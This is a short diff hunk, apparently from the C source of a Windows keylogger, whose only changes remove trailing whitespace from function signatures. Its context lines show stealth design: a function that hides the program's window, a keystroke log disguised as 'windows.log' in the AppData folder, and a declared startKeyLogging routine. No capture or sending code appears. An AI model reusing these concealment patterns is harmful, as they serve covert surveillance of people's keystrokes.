@@ -8,7 +8,7 @@
 bool invisible = true;
 char fileName[MAX_PATH];
 
-void hide(void) 
+void hide(void)
 {
     HWND stealth;
 
@@ -22,7 +22,7 @@ void hide(void)
     ShowWindow(stealth, 0);
 }
 
-void init(void) 
+void init(void)
 {
     // get path to appdata folder
     char* dest = "%appdata%\\windows.log";
@@ -70,7 +70,7 @@ char getFileName()
     return fileName;
 }
 
-int main(int argc, char* argv[]) 
+int main(int argc, char* argv[])
 {
     int startKeyLogging(char* argv[]);
 
